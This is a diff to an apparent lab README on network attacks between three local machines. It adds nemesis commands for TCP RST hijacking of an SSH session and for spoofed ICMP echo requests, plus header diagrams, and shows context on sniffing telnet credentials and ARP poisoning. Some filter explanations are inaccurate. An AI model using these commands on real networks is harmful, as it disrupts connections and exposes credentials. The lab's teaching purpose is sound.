@@ -11,6 +11,10 @@
     + [2.2 RST Hijacking](#22-rst-hijacking)
     + [2.3 Redirect response to ICMP echo/request](#23-redirect-response-to-icmp-echo-request)
   * [3. OpenVAS](#3-openvas)
+  * [4. References](#4-references)
+  	+ [TCP header](#tcp-header)
+  	+ [IP header](#ip-header)
+  	+ [Ethernet header](#ethernet-header)
 
 ### Setup
 
@@ -32,7 +36,7 @@ Should the check fail, follow the instructions in FIX
 
 #### 1.2 `tcpdump`
 
-Tcpdump prints the contents of network packets. With the necessary privileges on a system through which unencrypted traffic such as Telnet or HTTP passes, a user can use tcpdump to view login IDs, passwords, the URLs and content of websites being viewed, or any other unencrypted information. Here's a nice [tutorial](https://danielmiessler.com/study/tcpdump/) and [usage examples](https://www.rationallyparanoid.com/articles/tcpdump.html).
+Tcpdump prints the contents of network packets. With the necessary privileges on a system through which unencrypted traffic such as Telnet or HTTP passes, a user can use tcpdump to view login IDs, passwords, the URLs and content of websites being viewed, or any other unencrypted information. Here's a nice ghetto [documentation](https://www.wains.be/pub/networking/tcpdump_advanced_filters.txt).
 
 Run `sudo tcpdump` on machine 3, and generate a ICMP packet from machine 1 to 2 using
 
@@ -46,7 +50,7 @@ The output should resemble:
 17:07:30.455664 IP machine2 > machine1: ICMP echo reply, id 2701, seq 1, length 64
 ```
 
-The `-X` option prints each packet in HEX and ASCII minus its link level header. The `-XX` option prints each packet in HEX and ASCII including its link level header (AKA ethernet header). Inside the HEX dump output is the destination and source MAC addresses. 
+The `-X` option prints each packet in HEX and ASCII minus its link level header. The `-XX` option prints each packet in HEX and ASCII including its link level header (refer to [ethernet header](#ethernet-header)). Inside the HEX dump output is the destination and source MAC addresses. 
 
 
 On machine 3 run `sudo tcpdump -X dst host 192.168.1.1` and start a telnet connection from machine 2 to 1 
@@ -67,7 +71,7 @@ Repeat the telnet connection from machine 1 to 2.
 On wireshark follow the TCP stream of the telnet connection.
 The output should have both the user and password in clear text.
 
-Here you can check the Ethernet, IP and TCP headers in ASCII that was in the HEX dump:
+Here you can check the [Ethernet](#ethernet-header), IP and TCP(#tcp-header) headers in ASCII that was in the HEX dump:
 
 ![](.images/wireshark_hexdump.png?raw=true)
 
@@ -117,16 +121,76 @@ machine2 (192.168.1.2) at 08:00:27:94:55:1f [ether] on enp0s8
 ```
 Notice how the MAC address is the same for both machines.
 
-(Nemesis can natively craft and inject [ARP](http://nemesis.sourceforge.net/manpages/nemesis-arp.1.html), DNS, ETHERNET, ICMP, IGMP, IP, OSPF, RIP, TCP and UDP packets)
+(Nemesis can natively craft and inject [ARP](http://nemesis.sourceforge.net/manpages/nemesis-arp.1.html), DNS, ETHERNET, ICMP, IGMP, IP, OSPF, RIP, [TCP](http://nemesis.sourceforge.net/manpages/nemesis-tcp.1.html) and UDP packets)
 
 #### 2.2 RST Hijacking
 
-TODO
-I could not get this thing to work. Pls help
+The purpose of this attack is to reset a TCP connection.
+
+**Machine 3 will be the attacker**. In machine 3 use tcpdump to find the ack number and port being used in the ssh connection.
+```
+tcpdump -S -n -e -l “tcp[13] & 16 == 16”
+```
+
+-S Prints absolute sequence numbers.
+
+-n Displays IP addresses and port numbers instead of domain and service names when capturing packets.
+
+-e Gets the ethernet header too.
+
+-l Makes stdout line buffered. Useful if you want to see the data while capturing it.
+
+“tcp[13] & 16 == 16” Gets the ACK and SYN number present in octet 13 (refer to [TCP connection](#tcp-header)).
+
+Set a ssh connection between machine 1 and 2. In machine 1:
+
+```
+ssh 192.168.1.2
+```
+
+Use machine 3 to send a reset packet to one of the machines.
+
+```
+nemesis tcp -v -fR -S 192.168.1.2 -x 22 -D 192.168.1.1 -y <port> -s <ack number>
+```
+
+where the `<port>` and the `<ack number>` are in the last line outputed in the tcpdump executed before. If you did the ssh connection from machine 2, switch the IPs of the machines.
+
+-fR Specifies a RESET flag within the TCP header.
+
+-x Specifies the source-port within the TCP header.
+
+-y Specifies the destination-port within the TCP header.
+
+-s Specifies the sequence-number within the TCP header.
+
+The outcome of this should resemble:
+
+```
+packet_write_wait: Connection to 192.168.1.2 port 22: Broken pipe
+```
 
 #### 2.3 Redirect response to ICMP echo/request
 
-TODO
+This attack allows a ping response to be sent to a machine that didn’t make the
+request.
+
+In machine 3, use tcpdump to spy the source and destination in the packets.
+
+```
+tcpdump -n “ip[9]=1”
+```
+
+Refer to [IP Header](#ip-header)
+
+In machine 3, send a ICMP packet with the wrong source.
+
+```
+nemesis icmp -S <source IP> -D <destination IP>
+```
+
+For instance, use source ```192.168.1.1``` and destination ```192.168.1.2```. Watch the tcpdump. Machine 2 replied to machine 1, but machine 1 never asked anything!
+
 
 ### 3. OpenVAS
 Open the browser in `localhost` on the machine with openVAS (alternatively `192.168.1.[MACHINE]:443`).
@@ -137,3 +201,100 @@ Login in with
 1. Navigate to Scans > Tasks > Task Wizard and input the ip of the desired target.
 2. Wait for like 30 mins :^)
 3. Profit.
+
+
+### 4. References
+
+#### TCP Header
+
+The structure of a TCP header without options:
+
+```
+ 0                            15                              31
+-----------------------------------------------------------------
+|          source port          |       destination port        |
+-----------------------------------------------------------------
+|                        sequence number                        |
+-----------------------------------------------------------------
+|                     acknowledgment number                     |
+-----------------------------------------------------------------
+|  HL   | rsvd  |C|E|U|A|P|R|S|F|        window size            |
+-----------------------------------------------------------------
+|         TCP checksum          |       urgent pointer          |
+-----------------------------------------------------------------
+```
+
+The octet 13 contains the TCP control bits where th ACK (A) number and SYN (S) number are present:
+
+```
+|C|E|U|A|P|R|S|F|
+|---------------|
+|0 0 0 1 0 0 0 0|
+|---------------|
+|7 6 5 4 3 2 1 0|
+```
+
+Since we only want to see ACK (which is bit 4 - in decimal 16), we will use the command:
+
+```
+tcpdump -S -n -e -l “tcp[13] & 16 == 16”
+```
+
+or
+
+
+```
+tcpdump -S -n -e -l “tcp[13] = 16”
+```
+
+That means "let the 13th octet of a TCP datagram have the decimal value 16".
+
+The connection sequence with regard to the TCP control bits is
+
+1) Caller sends SYN 
+
+2) Recipient responds with SYN, ACK 
+
+3) Caller sends ACK 
+
+For more information check `man tcpdump` at "Capturing TCP packets with particular flag combinations (SYN-ACK, URG-ACK, etc.)".
+
+#### IP Header
+
+```
+0                   1                   2                   3   
+0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|Version|  IHL  |Type of Service|          Total Length         |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|         Identification        |Flags|      Fragment Offset    |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|  Time to Live |    Protocol   |         Header Checksum       |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                       Source Address                          |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Destination Address                        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Options                    |    Padding    | <-- optional
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                            DATA ...                           |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+```
+
+The command:
+
+```
+tcpdump “ip[9]=1”
+```
+
+Will get both the source and the destination address alike the TCP header.
+
+(make this more complete...)
+
+#### Ethernet Header
+
+```
+-------------------------------------------------------------------------------
+| Preamble | Dest MAC address | Source MAC address | Type/Length | Data | FCS |
+-------------------------------------------------------------------------------
+```
